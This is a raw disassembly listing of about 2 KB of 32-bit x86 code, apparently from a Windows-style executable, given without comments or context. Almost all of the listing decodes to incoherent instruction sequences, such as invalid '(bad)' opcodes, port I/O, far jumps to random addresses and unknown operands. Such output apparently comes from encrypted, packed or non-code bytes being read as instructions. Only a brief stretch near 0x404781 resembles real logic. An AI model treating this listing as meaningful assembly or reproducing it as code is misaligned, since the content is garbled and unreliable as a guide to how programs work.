  4041e5:	(bad)  
  4041e6:	stos   DWORD PTR es:[edi],eax
  4041e7:	repnz mov al,gs:0x92b6ac79
  4041ee:	inc    ecx
  4041ef:	data16 mov ch,0x64
  4041f2:	fnstenv es:[edi]
  4041f5:	bound  edx,QWORD PTR [edi-0x290da234]
  4041fb:	xor    al,0x8a
  4041fd:	push   ds
  4041fe:	xchg   edi,eax
  4041ff:	jmp    0x40424c
  404201:	into   
  404202:	mov    edi,esp
  404204:	pop    edx
  404205:	sub    esp,ebp
  404207:	retf   0x1baf
  40420a:	jle    0x40420a
  40420c:	mov    ebp,0xc35e99cb
  404211:	scas   al,BYTE PTR es:[edi]
  404212:	adc    BYTE PTR [ebx-0x34ae256b],ah
  404218:	out    0x17,al
  40421a:	sahf   
  40421b:	call   0xe5c52761
  404220:	or     esp,eax
  404222:	push   ss
  404223:	outs   dx,BYTE PTR ds:[esi]
  404224:	sub    al,0x61
  404226:	call   0xf6d674e7
  40422b:	icebp  
  40422c:	mov    WORD PTR [esp+eax*4],fs
  40422f:	ds fxam 
  404232:	rcr    DWORD PTR [edx],cl
  404234:	daa    
  404235:	mov    WORD PTR [esi],fs
  404237:	or     esi,DWORD PTR [edi-0x38936b3b]
  40423d:	cmc    
  40423e:	xchg   edi,eax
  40423f:	sbb    al,0x12
  404241:	xlat   BYTE PTR ds:[ebx]
  404242:	and    eax,0xab44d244
  404247:	(bad)  
  404248:	lock and ah,cl
  40424b:	out    dx,al
  40424c:	jmp    0x404284
  40424e:	mov    ds,WORD PTR [ebp+esi*2+0x3efcb45c]
  404255:	mov    esi,0x5f8ffaea
  40425a:	(bad)  
  40425b:	ds sar ecx,0x21
  40425f:	ror    DWORD PTR [esi+0x699b6716],cl
  404265:	jbe    0x40427f
  404267:	aam    0x32
  404269:	adc    BYTE PTR [edx],ch
  40426b:	sbb    eax,0x5d5d2ce6
  404270:	loopne 0x4042c2
  404272:	push   esp
  404273:	bnd ja 0x4042db
  404276:	fcmove st,st(5)
  404278:	cmp    dl,BYTE PTR [edx-0x5f]
  40427b:	sub    eax,0xe859a1fd
  404280:	outs   dx,BYTE PTR ds:[esi]
  404281:	push   ss
  404282:	jmp    DWORD PTR [edx+0x338142be]
  404288:	(bad)  
  404289:	jl     0x404222
  40428b:	shl    ebp,0xa4
  40428e:	sti    
  40428f:	cmp    al,0xe1
  404291:	add    dh,BYTE PTR [ecx]
  404293:	push   ebp
  404294:	sbb    ecx,DWORD PTR [ecx-0x66]
  404297:	pop    esp
  404298:	cld    
  404299:	fst    DWORD PTR [eax+0x8c75517]
  40429f:	mov    edx,0xffa74339
  4042a4:	ret    0xff0f
  4042a7:	jmp    0x6abac745
  4042ac:	xchg   ebx,eax
  4042ad:	ror    DWORD PTR [ecx],cl
  4042af:	test   al,0x2d
  4042b1:	data16 jno 0x40424e
  4042b4:	cli    
  4042b5:	retf   0xed58
  4042b8:	jno    0x4042d4
  4042ba:	loope  0x4042e7
  4042bc:	rcl    eax,1
  4042be:	adc    eax,0x9209c523
  4042c3:	aas    
  4042c4:	jbe    0x404268
  4042c6:	inc    esp
  4042c7:	fdiv   QWORD PTR [edi+0x15]
  4042ca:	loope  0x40431b
  4042cc:	jb     0x40434d
  4042ce:	mov    bl,0xd2
  4042d0:	addr16 xchg edi,eax
  4042d2:	push   ds
  4042d3:	aas    
  4042d4:	cmp    dl,0x8e
  4042d7:	add    DWORD PTR [eax+0x22f0af97],ecx
  4042dd:	xor    DWORD PTR [eax],ebp
  4042df:	hlt    
  4042e0:	mov    cl,0x40
  4042e2:	xchg   ebp,eax
  4042e3:	iret   
  4042e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e5:	in     al,dx
  4042e6:	pop    ebp
  4042e7:	loop   0x4042a5
  4042e9:	sahf   
  4042ea:	mov    ds:0x79df1c0f,al
  4042ef:	mov    cl,0x39
  4042f1:	sbb    DWORD PTR [ebx+0x3de8f9a8],0x52
  4042f8:	in     eax,0x1c
  4042fa:	stos   BYTE PTR es:[edi],al
  4042fb:	mov    dl,0x77
  4042fd:	add    al,0xb2
  4042ff:	push   edx
  404300:	aaa    
  404301:	mov    edi,0x5b97dacd
  404306:	dec    eax
  404307:	jne    0x404341
  404309:	xchg   esp,eax
  40430a:	fistp  DWORD PTR [ebx-0x36f498e9]
  404310:	sub    al,cl
  404312:	push   es
  404313:	jl     0x4042cd
  404315:	xor    ah,BYTE PTR [eax]
  404317:	cmp    al,0x7a
  404319:	adc    ebx,DWORD PTR [ebx-0xe0451d9]
  40431f:	mov    ecx,0xa45f319a
  404324:	sbb    ch,BYTE PTR [ebp+edx*1-0x6d72ce68]
  40432b:	aam    0x7a
  40432d:	adc    BYTE PTR [esi+0x5cdea49e],bh
  404333:	dec    esi
  404334:	outs   dx,DWORD PTR ds:[esi]
  404335:	scas   eax,DWORD PTR es:[edi]
  404336:	lahf   
  404337:	or     DWORD PTR [edx],ecx
  404339:	leave  
  40433a:	or     eax,0xf390cf34
  40433f:	adc    edx,ecx
  404341:	lods   al,BYTE PTR ds:[esi]
  404342:	or     eax,0xb923ae30
  404347:	sbb    bh,BYTE PTR [edi]
  404349:	inc    edi
  40434a:	leave  
  40434b:	and    BYTE PTR [edi-0x41399784],dh
  404351:	mov    eax,0x9a6b247
  404356:	outs   dx,BYTE PTR ds:[esi]
  404357:	jp     0x404375
  404359:	shl    DWORD PTR [esi+edx*4+0x322e2f94],0x93
  404361:	ins    BYTE PTR es:[edi],dx
  404362:	inc    ebx
  404363:	mov    dl,0x61
  404365:	jp     0x4043b5
  404367:	xchg   edx,eax
  404368:	pop    es
  404369:	cmp    eax,0x100b9209
  40436e:	cmp    DWORD PTR [eax],esp
  404370:	and    eax,0xc2843312
  404375:	mov    ecx,0x7d8f8fc9
  40437a:	(bad)  
  40437b:	adc    BYTE PTR [eax+0x24],ch
  40437e:	cmp    edx,DWORD PTR [ebp-0x5c]
  404381:	retf   0x64c4
  404384:	ja     0x40433f
  404386:	xchg   BYTE PTR [edi],cl
  404388:	into   
  404389:	test   DWORD PTR [ecx+0x2],eax
  40438c:	sbb    DWORD PTR [ebx+0x79737334],eax
  404392:	rol    edi,cl
  404394:	outs   dx,BYTE PTR ds:[esi]
  404395:	push   ebp
  404396:	nop
  404397:	push   es
  404398:	dec    ebx
  404399:	sub    DWORD PTR [ebx],ebp
  40439b:	mov    dl,0xee
  40439d:	test   eax,0xff152167
  4043a2:	call   0xd741091a
  4043a7:	lock adc eax,0xc5fbc54f
  4043ad:	fidiv  WORD PTR [ebx]
  4043af:	dec    ecx
  4043b0:	push   edx
  4043b1:	aad    0x1e
  4043b3:	mov    bh,ah
  4043b5:	(bad)  
  4043b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b7:	xchg   BYTE PTR [ebx+edi*1],bh
  4043ba:	mov    ds:0xfed655c7,eax
  4043bf:	int    0xf2
  4043c1:	test   al,0x3
  4043c3:	cs jmp 0x9102ea0
  4043c9:	inc    ebp
  4043ca:	fiadd  DWORD PTR [eax+0x5e3a738b]
  4043d0:	and    al,BYTE PTR [eax]
  4043d2:	lods   eax,DWORD PTR ds:[esi]
  4043d3:	stos   DWORD PTR es:[edi],eax
  4043d4:	push   0x9245ad02
  4043d9:	jl     0x40444b
  4043db:	lea    edx,[ebx+0x28e22a0a]
  4043e1:	mov    DWORD PTR [ebx-0x13],esi
  4043e4:	add    al,0x3a
  4043e6:	fs sti 
  4043e8:	dec    esp
  4043e9:	cmp    al,0x2d
  4043eb:	test   ah,0xfb
  4043ee:	push   edi
  4043ef:	add    DWORD PTR [ebx],ebp
  4043f1:	fdiv   QWORD PTR [edi]
  4043f3:	pop    ebp
  4043f4:	scas   eax,DWORD PTR es:[edi]
  4043f5:	push   eax
  4043f6:	mov    eax,0x44c67458
  4043fb:	test   eax,0x6b2f2f6a
  404400:	dec    ecx
  404401:	cmp    eax,0x2b64129d
  404406:	les    edx,FWORD PTR [edx]
  404408:	je     0x4043f5
  40440a:	push   ebp
  40440b:	rol    DWORD PTR [edx],1
  40440d:	and    esp,DWORD PTR [edi-0x13]
  404410:	push   cs
  404411:	adc    bl,BYTE PTR [ebx+0x2c]
  404414:	ret    0x18b9
  404417:	iret   
  404418:	and    al,0x6d
  40441a:	ins    DWORD PTR es:[edi],dx
  40441b:	scas   al,BYTE PTR es:[edi]
  40441c:	pop    ebx
  40441d:	pop    esi
  40441e:	jb     0x40442e
  404420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404421:	xor    BYTE PTR [ebx+0x5f],bh
  404424:	xor    esp,DWORD PTR ds:0x5e781b28
  40442a:	sub    cl,dh
  40442c:	xchg   ebx,eax
  40442d:	jb     0x404466
  40442f:	retf   0x77f7
  404432:	jmp    0x404472
  404434:	xchg   esp,eax
  404435:	stos   BYTE PTR es:[edi],al
  404436:	nop
  404437:	and    ah,dl
  404439:	(bad)  
  40443b:	test   eax,0x6f47a8bf
  404440:	div    DWORD PTR [esi+eax*8]
  404443:	and    eax,0x5ed63a8b
  404448:	push   eax
  404449:	stc    
  40444a:	imul   ebx,edx,0x65f6f041
  404450:	ins    BYTE PTR es:[edi],dx
  404451:	or     BYTE PTR [edx+0x7],bh
  404454:	in     eax,dx
  404455:	test   al,0x61
  404457:	xchg   esp,eax
  404458:	nop
  404459:	je     0x404407
  40445b:	mov    edi,0xe7727959
  404460:	daa    
  404461:	xchg   ebp,eax
  404462:	arpl   bp,ax
  404464:	rcl    BYTE PTR [esp+ecx*4],cl
  404467:	mov    dh,0x9d
  404469:	popf   
  40446a:	xchg   DWORD PTR [edi],esi
  40446c:	leave  
  40446d:	pop    edx
  40446e:	jecxz  0x4044a8
  404470:	push   edx
  404471:	mov    cs,WORD PTR [esi]
  404473:	jmp    0x182a:0x4a91478d
  40447a:	rol    BYTE PTR ds:0xfee9f833,cl
  404480:	add    al,BYTE PTR [eax]
  404482:	add    BYTE PTR [edx],al
  404484:	pop    ebp
  404485:	inc    esp
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044ea
  404490:	in     eax,0xa8
  404492:	rcr    DWORD PTR [esi+0x18],0x7e
  404496:	jle    0x4044f0
  404498:	jl     0x404518
  40449a:	jle    0x4044cd
  40449c:	jns    0x4044a4
  40449e:	or     eax,0x9d219254
  4044a3:	mov    ch,0x7b
  4044a5:	mov    ah,0x38
  4044a7:	sub    esp,edi
  4044a9:	mov    dh,BYTE PTR [ebx]
  4044ab:	push   esi
  4044ac:	jmp    0x4044c5
  4044ae:	sbb    bh,dl
  4044b0:	outs   dx,DWORD PTR ds:[esi]
  4044b1:	mov    ah,0x4b
  4044b3:	in     eax,0xd2
  4044b5:	aas    
  4044b6:	fild   DWORD PTR [ebp+0x2ca09c0f]
  4044bc:	iret   
  4044bd:	cmp    esp,0x72
  4044c0:	add    eax,0x48fd74d6
  4044c5:	sub    eax,0x4d9eb3e9
  4044ca:	xor    ch,0x5
  4044cd:	push   edi
  4044ce:	dec    ebp
  4044cf:	popa   
  4044d0:	dec    esp
  4044d1:	loope  0x4044ec
  4044d3:	push   esi
  4044d4:	cmp    DWORD PTR [ebx-0x3f21a904],eax
  4044da:	es gs mul ecx
  4044de:	mov    ah,0xfc
  4044e0:	or     BYTE PTR [edx+edx*8+0x5bc8652c],0x7c
  4044e8:	aaa    
  4044e9:	jge    0x404561
  4044eb:	ss icebp 
  4044ed:	int3   
  4044ee:	pusha  
  4044ef:	dec    ecx
  4044f0:	out    0x47,eax
  4044f2:	shl    edx,cl
  4044f4:	(bad)  [eax-0x3b418c58]
  4044fa:	jmp    0x404520
  4044fc:	not    DWORD PTR [eax+edx*8]
  4044ff:	and    al,0x4c
  404501:	push   eax
  404502:	retf   0x496e
  404505:	ins    BYTE PTR es:[edi],dx
  404506:	out    dx,eax
  404507:	hlt    
  404508:	dec    esp
  404509:	ror    BYTE PTR [esi-0x5a9e12f9],cl
  40450f:	ret    
  404510:	out    0xc2,al
  404512:	inc    edx
  404513:	cdq    
  404514:	and    al,0xc1
  404516:	fdivr  QWORD PTR [ecx]
  404518:	adc    al,0x86
  40451a:	mov    bl,0x61
  40451c:	lods   eax,DWORD PTR ds:[esi]
  40451d:	int3   
  40451e:	ror    ch,cl
  404520:	or     BYTE PTR [ebp+0x36],bl
  404523:	jnp    0x404565
  404525:	fnstenv [ecx-0x47]
  404528:	cdq    
  404529:	div    BYTE PTR [eax]
  40452b:	mov    ecx,0x1a920219
  404530:	xchg   al,ah
  404532:	push   0xffffff99
  404534:	adc    BYTE PTR [edx],al
  404536:	mov    ebx,0xf5b0177
  40453b:	mov    ebp,0xcf878c59
  404540:	dec    esi
  404541:	jne    0x404571
  404543:	out    0x41,al
  404545:	mov    ebx,0xd06099aa
  40454a:	mov    dl,0x76
  40454c:	jns    0x40454b
  40454e:	popa   
  40454f:	push   eax
  404550:	add    al,ah
  404552:	ror    BYTE PTR [edx-0x66],cl
  404555:	fst    QWORD PTR [esi-0x3f80366]
  40455b:	(bad)  
  40455e:	sahf   
  40455f:	inc    edi
  404560:	mov    bh,0x8f
  404562:	sub    eax,0x33d0e863
  404567:	sbb    eax,0x62620b9c
  40456c:	push   es
  40456d:	or     DWORD PTR [edx-0x543aaa67],0xfffffff5
  404574:	leave  
  404575:	and    al,0x14
  404577:	and    edx,0x2c7933a2
  40457d:	mov    dh,0x36
  40457f:	add    ch,bh
  404581:	mov    al,0x3e
  404583:	scas   al,BYTE PTR es:[edi]
  404584:	pushf  
  404585:	xor    edx,ebp
  404587:	inc    ecx
  404588:	clc    
  404589:	pop    eax
  40458a:	jns    0x4045b1
  40458c:	leave  
  40458d:	cdq    
  40458e:	into   
  40458f:	repz xor al,0x47
  404592:	xchg   edi,eax
  404593:	adc    esp,DWORD PTR [ebp+0x7a]
  404596:	add    bl,BYTE PTR [eax+edx*2-0x52]
  40459a:	test   al,0xcd
  40459c:	mov    cl,0xfb
  40459e:	push   ebx
  40459f:	les    esi,FWORD PTR [edx-0x5]
  4045a2:	mov    ebp,DWORD PTR [ebx+esi*1+0x3b3fdb21]
  4045a9:	inc    ebx
  4045aa:	dec    DWORD PTR [ecx-0x51bc2cea]
  4045b0:	imul   esi,DWORD PTR [esi],0xffffffb6
  4045b3:	pop    es
  4045b4:	jle    0x4045a6
  4045b6:	jmp    0x40460e
  4045b8:	dec    edx
  4045b9:	add    al,0x52
  4045bb:	sub    eax,0x177275f0
  4045c0:	inc    ecx
  4045c1:	xlat   BYTE PTR ds:[ebx]
  4045c2:	inc    edi
  4045c3:	nop
  4045c4:	mov    edi,0xbcb584a
  4045c9:	push   ss
  4045ca:	ss or  bh,ah
  4045cd:	daa    
  4045ce:	push   ds
  4045cf:	pop    edx
  4045d0:	lahf   
  4045d1:	stos   DWORD PTR es:[edi],eax
  4045d2:	sub    ah,BYTE PTR [edi+ebp*4+0x5e]
  4045d6:	add    bh,BYTE PTR [eax+eiz*2-0x7c]
  4045da:	ds jno 0x404598
  4045dd:	shl    DWORD PTR [edx+ecx*1-0x6e2b9814],cl
  4045e4:	jecxz  0x4045dd
  4045e6:	jle    0x404635
  4045e8:	jbe    0x40456a
  4045ea:	sbb    al,0x51
  4045ec:	push   ebp
  4045ed:	xor    dh,BYTE PTR [eax+0x6de05e6c]
  4045f3:	and    eax,0xaad8869a
  4045f8:	ss sbb eax,0x14600293
  4045fe:	jae    0x40464c
  404600:	test   DWORD PTR [edi+0x1195796c],ebp
  404606:	cwde   
  404607:	sbb    edi,DWORD PTR [eax]
  404609:	scas   al,BYTE PTR es:[edi]
  40460a:	push   edi
  40460b:	cwde   
  40460c:	sar    BYTE PTR [eax],1
  40460e:	loop   0x4045f7
  404610:	fwait
  404611:	mov    esp,0x731fac15
  404616:	cmp    cl,dl
  404618:	sbb    al,0xd1
  40461a:	stos   BYTE PTR es:[edi],al
  40461b:	and    eax,0x79e796b
  404620:	ss add eax,0xfcb13a68
  404626:	into   
  404627:	loope  0x404690
  404629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40462a:	fwait
  40462b:	mov    ebx,DWORD PTR [eax-0x22]
  40462e:	ror    BYTE PTR [edx-0x66a1fd83],1
  404634:	xor    eax,0x78b3f3a2
  404639:	and    BYTE PTR [ebx-0x65aebcd5],dl
  40463f:	(bad)  
  404640:	ins    DWORD PTR es:[edi],dx
  404641:	push   es
  404642:	jo     0x404647
  404644:	dec    ecx
  404645:	in     al,0x1c
  404647:	arpl   WORD PTR [esi+0x69],ax
  40464a:	xlat   BYTE PTR ds:[ebx]
  40464b:	call   0x259d:0xbb78
  404651:	rcr    DWORD PTR [edi],cl
  404653:	ret    
  404654:	mov    dh,0x25
  404656:	mov    ebx,?
  404658:	lea    edx,[ecx-0x672a2f99]
  40465e:	das    
  40465f:	call   0xc2287720
  404664:	in     eax,dx
  404665:	inc    ebx
  404666:	vdivsd xmm7,xmm2,QWORD PTR [esi+esi*1]
  40466b:	adc    eax,0xfc4f9254
  404670:	push   cs
  404671:	push   edx
  404672:	or     al,BYTE PTR [eax]
  404674:	xor    dl,ch
  404676:	scas   al,BYTE PTR es:[edi]
  404677:	sub    al,0x2d
  404679:	int3   
  40467a:	mov    ds:0xb56c7362,al
  40467f:	adc    cl,BYTE PTR ds:0xf6181d4f
  404685:	fcomip st,st(0)
  404687:	retf   0xec90
  40468a:	outs   dx,DWORD PTR ds:[esi]
  40468b:	push   ebx
  40468c:	in     al,0xb4
  40468e:	and    bl,BYTE PTR [esi-0x23]
  404691:	add    eax,edi
  404693:	sti    
  404694:	outs   dx,BYTE PTR ds:[esi]
  404695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404696:	leave  
  404697:	loope  0x404623
  404699:	retf   
  40469a:	lahf   
  40469b:	aas    
  40469c:	push   ecx
  40469d:	xchg   ecx,eax
  40469e:	and    al,0xca
  4046a0:	xor    BYTE PTR [edi+esi*1],al
  4046a3:	push   eax
  4046a4:	ds in  al,0xb5
  4046a7:	es inc esp
  4046a9:	scas   eax,DWORD PTR es:[edi]
  4046aa:	and    BYTE PTR [edi],ah
  4046ac:	stos   DWORD PTR es:[edi],eax
  4046ad:	xchg   ebx,ebp
  4046af:	xchg   esi,eax
  4046b0:	cmp    BYTE PTR [edi+eax*4],cl
  4046b3:	mov    dh,BYTE PTR [ebx-0x46]
  4046b6:	dec    esp
  4046b7:	test   BYTE PTR [ebx],bl
  4046b9:	popa   
  4046ba:	inc    edx
  4046bb:	scas   al,BYTE PTR es:[edi]
  4046bc:	setp   BYTE PTR [eax+0x14ba540d]
  4046c3:	cmp    BYTE PTR [ebp-0x1d],bh
  4046c6:	pop    ebx
  4046c7:	sahf   
  4046c8:	(bad)  
  4046c9:	jecxz  0x404715
  4046cb:	fstp   QWORD PTR [edx+0xb97f33c]
  4046d1:	shl    BYTE PTR [ebx-0x21],1
  4046d4:	xor    BYTE PTR [esp+eiz*4-0x47],bl
  4046d8:	das    
  4046d9:	call   0x8773:0xe8cd0600
  4046e0:	and    eax,0x64edffd
  4046e5:	outs   dx,DWORD PTR ds:[esi]
  4046e6:	sbb    eax,ebx
  4046e8:	or     eax,0x13bd152a
  4046ed:	mov    dh,0x9f
  4046ef:	les    ecx,FWORD PTR [edx]
  4046f1:	mov    ecx,0xce3147ae
  4046f6:	push   esi
  4046f7:	and    bh,cl
  4046f9:	sbb    esp,DWORD PTR [esi-0x132930ed]
  4046ff:	cmp    edx,0xa65a3ed8
  404705:	mov    ebp,edx
  404707:	sub    al,0xbd
  404709:	aam    0x71
  40470b:	popf   
  40470c:	push   0x11
  40470e:	xor    eax,0x6e23d667
  404713:	adc    BYTE PTR [ebp-0x512e023a],dl
  404719:	or     al,0x25
  40471b:	fcomp  DWORD PTR [eax-0x25]
  40471e:	dec    ebp
  40471f:	fwait
  404720:	hlt    
  404721:	in     eax,0xef
  404723:	cmp    eax,0x41ada15e
  404728:	test   eax,0xae5aa377
  40472d:	sub    al,0x1c
  40472f:	xor    al,BYTE PTR ss:[ebx]
  404732:	nop
  404733:	ds ret 
  404735:	icebp  
  404736:	scas   al,BYTE PTR es:[edi]
  404737:	fcomp  DWORD PTR [ecx-0x47]
  40473a:	xchg   DWORD PTR [eax+0x4],edx
  40473d:	cmp    ecx,ebp
  40473f:	fcmovne st,st(2)
  404741:	je     0x404785
  404743:	jg     0x404741
  404745:	(bad)  
  404746:	(bad)  
  404748:	jl     0x40477a
  40474a:	dec    ebp
  40474b:	(bad)  
  40474c:	out    dx,eax
  40474d:	mov    BYTE PTR [ecx],al
  40474f:	aad    0xa2
  404751:	adc    ah,BYTE PTR [esi-0x54fdf3b7]
  404757:	imul   edi,DWORD PTR [esi+0x6a],0x6d
  40475b:	inc    eax
  40475c:	nop
  40475d:	pop    ecx
  40475e:	jne    0x40476d
  404760:	cmp    BYTE PTR es:[edx+ecx*1-0x4aa93b8],bh
  404768:	inc    esi
  404769:	adc    al,0xb6
  40476b:	dec    ecx
  40476c:	mov    ecx,0x555ec304
  404771:	and    DWORD PTR [esi+0x14],edi
  404774:	xor    ch,cl
  404776:	pop    ebp
  404777:	sub    eax,0xb30f356e
  40477c:	mov    ds:0x55b4771,eax
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	ret    
  4047b5:	(bad)  
  4047b6:	fiadd  WORD PTR [ecx+0x7e7e27b8]
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x40474e
  4047c1:	mov    dh,dl
  4047c3:	adc    eax,0x9df7f272
  4047c8:	and    eax,0xfb4b220d
  4047cd:	pop    edi
  4047ce:	sub    DWORD PTR [edi-0xe],edx
  4047d1:	inc    ebp
  4047d2:	cmp    BYTE PTR [esi+0x37b119f2],bl
  4047d8:	pop    edx
  4047d9:	jmp    0x404789
  4047db:	data16 loopne 0x40482b
  4047de:	das    
  4047df:	pop    ds
  4047e0:	mov    bh,0xfa
  4047e2:	addr16 das 
  4047e4:	push   ebx
  4047e5:	cli    
  4047e6:	sub    edx,DWORD PTR [eax-0x24]
  4047e9:	lods   eax,DWORD PTR ds:[esi]
  4047ea:	mov    al,0x50
  4047ec:	cld    
  4047ed:	in     eax,dx
  4047ee:	jge    0x4047a3
  4047f0:	fucom  st(1)
  4047f2:	test   DWORD PTR [eax+0x3c],0xb29b87d
  4047f9:	pop    ebp
  4047fa:	in     eax,dx
  4047fb:	dec    esi
  4047fc:	inc    eax
  4047fd:	ins    DWORD PTR es:[edi],dx
  4047fe:	and    DWORD PTR ds:0x16a475b0,esi
  404804:	xchg   ecx,eax
  404805:	xchg   edi,eax
  404806:	fst    DWORD PTR [edx+0x42]
  404809:	mov    esp,0xae927d47
  40480e:	retf   
  40480f:	mov    al,ds:0x66efb302
  404814:	sub    eax,0xb29aa836
  404819:	cmp    bl,BYTE PTR [esp+edx*8+0x2f]
  40481d:	ds sub eax,0xf38072c7
  404823:	sub    edi,0x509e62bc
  404829:	mov    esp,0x12326d73
  40482e:	push   0x65
  404830:	jp     0x40486d
  404832:	aam    0x42
  404834:	arpl   WORD PTR [ebx-0x77094f9d],di
  40483a:	dec    edx
  40483b:	out    0x40,eax
  40483d:	inc    esp
  40483e:	mov    bl,al
  404840:	pop    DWORD PTR [eax-0x9]
  404843:	push   0x407e99d7
  404848:	mov    edx,0x77249158
  40484d:	inc    edi
  40484e:	dec    edx
  40484f:	push   ebx
  404850:	inc    ebx
  404851:	pop    ss
  404852:	inc    esi
  404853:	jno    0x40484a
  404855:	adc    esp,DWORD PTR [ebx+0x78b81892]
  40485b:	push   cs
  40485c:	aaa    
  40485d:	sbb    esp,DWORD PTR ds:0x876fce2f
  404863:	sub    ebx,DWORD PTR [ebx+0x61377150]
  404869:	mov    esi,0xf68160df
  40486e:	sbb    BYTE PTR [ebx-0x7e],ch
  404871:	ins    DWORD PTR es:[edi],dx
  404872:	rcr    BYTE PTR [eax+ebx*8+0x37],0x93
  404877:	shl    DWORD PTR [esi+0x25306941],cl
  40487d:	jne    0x404809
  40487f:	adc    eax,0x4b1e721b
  404884:	out    0x5,al
  404886:	sub    ebx,esp
  404888:	popa   
  404889:	mov    ?,WORD PTR [eax-0xd357ccd]
  40488f:	ins    BYTE PTR es:[edi],dx
  404890:	je     0x4048d5
  404892:	sub    al,0xab
  404894:	lods   al,BYTE PTR ds:[esi]
  404895:	sbb    DWORD PTR [eax-0x6e8108b2],esi
  40489b:	sub    ah,BYTE PTR [esi+0x8]
  40489e:	mov    eax,ds:0x5843c44c
  4048a3:	jno    0x4048d6
  4048a5:	shr    cl,0x71
  4048a8:	mov    WORD PTR [ecx],fs
  4048aa:	mov    WORD PTR [esi+0x7f],?
  4048ad:	adc    BYTE PTR [esi+ecx*1+0x5b67e6c8],0x76
  4048b5:	dec    esi
  4048b6:	imul   edx,eax,0xffffffe7
  4048b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048ba:	inc    ebp
  4048bb:	je     0x4048b3
  4048bd:	mov    ecx,0x501b0680
  4048c2:	xchg   ecx,eax
  4048c3:	jnp    0x404923
  4048c5:	mov    fs,WORD PTR [ebx+0x45f8aa35]
  4048cb:	das    
  4048cc:	inc    esi
  4048cd:	mov    bh,0xc0
  4048cf:	ds sub bl,cl
  4048d2:	loope  0x4048c2
  4048d4:	mov    BYTE PTR ds:0xe1c19228,ah
  4048da:	push   edx
  4048db:	sahf   
  4048dc:	lock push ax
  4048df:	inc    edx
  4048e0:	pusha  
  4048e1:	fidivr DWORD PTR [ecx+0x434cbbb1]
  4048e7:	jnp    0x404945
  4048e9:	mov    esp,0x31f47d06
  4048ee:	jo     0x4048cd
  4048f0:	pop    ebp
  4048f1:	xchg   ebp,eax
  4048f2:	lock push ss
  4048f4:	addr16 cmp eax,0x897f2ed7
  4048fa:	repnz test BYTE PTR [esi+0x6137680f],0x9a
  404902:	jp     0x4048af
  404904:	(bad)  
  404906:	adc    DWORD PTR [ebx+0x61d59c4d],edi
  40490c:	push   ebp
  40490d:	and    BYTE PTR ds:[ecx-0x7a4ff43a],0xc0
  404915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404916:	bswap  esi
  404918:	dec    edx
  404919:	adc    esi,DWORD PTR [ebx+0xe]
  40491c:	sub    al,0xed
  40491e:	mov    ebp,0x90c96272
  404923:	bound  ebx,QWORD PTR [edi+0x54]
  404926:	out    dx,al
  404927:	in     eax,dx
  404928:	pop    ss
  404929:	xchg   ecx,eax
  40492a:	jecxz  0x4048d2
  40492c:	retf   0xa161
  40492f:	cmp    dl,ch
  404931:	(bad)  
  404932:	loopne 0x4048ef
  404934:	mov    ebp,eax
  404936:	or     edx,ebx
  404938:	fsubr  QWORD PTR [ebp+0x110adc27]
  40493e:	aas    
  40493f:	pusha  
  404940:	jbe    0x404980
  404942:	fisub  WORD PTR fs:[edi]
  404945:	fld    QWORD PTR [ebx]
  404947:	out    dx,eax
  404948:	cmp    BYTE PTR [eax+0x54250d1d],bh
  40494e:	pop    ebx
  40494f:	xlat   BYTE PTR ds:[ebx]
  404950:	push   esi
  404951:	inc    ebp
  404953:	push   esp
  404954:	es xchg esp,esp
  404957:	scas   eax,DWORD PTR es:[edi]
  404958:	retf   0x3cdc
  40495b:	sahf   
  40495c:	scas   al,BYTE PTR es:[edi]
  40495d:	inc    edi
  40495e:	mov    ds:0x770976d4,eax
  404963:	call   DWORD PTR [esp+edx*2]
  404966:	test   al,0xe0
  404968:	adc    esp,DWORD PTR [ecx-0x19600627]
  40496e:	add    eax,0xffffffd8
  404971:	call   0x4f5:0x3fb4cd41
  404978:	rol    DWORD PTR [edx+0x11349b3e],0xa1
  40497f:	xchg   DWORD PTR [ebx+0x38f14b74],edi
  404985:	add    cl,BYTE PTR [esp+ecx*2]
  404988:	pop    ebp
  404989:	pop    ds
  40498a:	in     al,0xb6
  40498c:	or     eax,DWORD PTR [edi*2-0x7ca8a136]
  404993:	imul   edi,DWORD PTR [ecx+0x28d2c3f3],0xa5c7a66a
  40499d:	std    
  40499e:	mov    esp,0xd813ecd4
  4049a3:	ds pusha 
  4049a5:	sbb    al,0xb5
  4049a7:	(bad)  
  4049a8:	dec    edi
  4049a9:	sbb    al,0x14
  4049ab:	mov    cl,0x46
  4049ad:	jmp    0x39e5:0xa979ebe8
  4049b4:	xchg   edx,eax
  4049b5:	ret    
  4049b6:	aaa    
  4049b7:	xor    DWORD PTR [edi-0x713746f5],esp
  4049bd:	cmp    BYTE PTR [ecx],ah
  4049bf:	stc    
  4049c0:	push   0x7c
  4049c2:	mov    ah,BYTE PTR [esi-0x68afdaf3]
  4049c8:	rcl    esp,cl
  4049ca:	fst    QWORD PTR [ebp-0x50]
  4049cd:	shl    bh,cl
  4049cf:	dec    edi
  4049d0:	cmp    eax,0x76b68d80
  4049d5:	stc    
  4049d6:	and    DWORD PTR [edi+0x6a],ebp
  4049d9:	add    DWORD PTR [esi-0x62],ecx
  4049dc:	pushf  
  4049dd:	mov    BYTE PTR ds:[edi+ebx*2+0x7504470a],0x32
  4049e6:	jge    0x4049d2
